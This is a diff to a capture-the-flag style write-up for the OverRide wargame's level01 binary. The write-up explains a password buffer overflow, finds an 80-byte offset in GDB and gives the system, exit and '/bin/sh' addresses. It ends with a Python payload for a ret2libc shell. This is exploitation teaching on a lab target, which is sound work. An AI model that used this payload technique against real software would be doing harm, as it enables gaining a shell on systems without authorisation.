@@ -8,23 +8,11 @@ Partial RELRO   No canary found   NX disabled   No PIE          No RPATH   No RU
 
 *	We spawn with a [level01](src/level01) executable.
 *	Here is the [code](src/level01.c):
-*	Basically, the code is asking for a username and a password. User seems to be `dat_wil`:
-	```console
-	level01@OverRide:~$ ./level01 
-	********* ADMIN LOGIN PROMPT *********
-	Enter Username: test
-	verifying username....
-
-	nope, incorrect username...
-
-	level01@OverRide:~$ ./level01 
-	********* ADMIN LOGIN PROMPT *********
-	Enter Username: dat_wil
-	verifying username....
-
-	Enter Password: 
-	```
-*	And for the password we should be able to overflow the variable
+* The program asks for a username and a password:
+  - The username must be `dat_wil`.
+  - The password buffer is 64 bytes, but `fgets()` reads up to 100 bytes, allowing a buffer overflow.
+  - The program always rejects the password, so we need to exploit the overflow.
+* Using a cyclic pattern in GDB, we overwrite EIP and find an offset of `80 bytes`:
 	```gdb
 	(gdb) run
 	Starting program: /home/users/level01/level01 
@@ -41,16 +29,16 @@ Partial RELRO   No canary found   NX disabled   No PIE          No RPATH   No RU
 	0x37634136 in ?? ()
 	(gdb) 
 	```
-	We found an offset at `80 bytes`
-*	We should be able to do a `Ret2libc`:
-	```gdb
-	(gdb) p system
-	$1 = {<text variable, no debug info>} 0xf7e6aed0 <system>
-	(gdb) p exit
-	$2 = {<text variable, no debug info>} 0xf7e5eb70 <exit>
-	(gdb) find &system,+9999999,"/bin/sh"
-	0xf7f897ec
-	```
+* We can use ret2libc to execute `system("/bin/sh")`. Let's retrieve the addresses:
+  ```gdb
+  (gdb) p system
+  $1 = 0xf7e6aed0 <system>
+  (gdb) p exit
+  $2 = 0xf7e5eb70 <exit>
+  (gdb) find &system,+9999999,"/bin/sh"
+  0xf7f897ec
+  ```
+* Our payload consists of 80 bytes of padding, followed by `system`, `exit` (return address) and `/bin/sh` (argument).
 *	Let's finish this exerice :
 	```console
 	level01@OverRide:~$ python -c 'print "dat_wil\n" + "a"*80 + "\xf7\xe6\xae\xd0"[::-1] + "\xf7\xe5\xeb\x70"[::-1] + "\xf7\xf8\x97\xec" [::-1]' > /tmp/level01
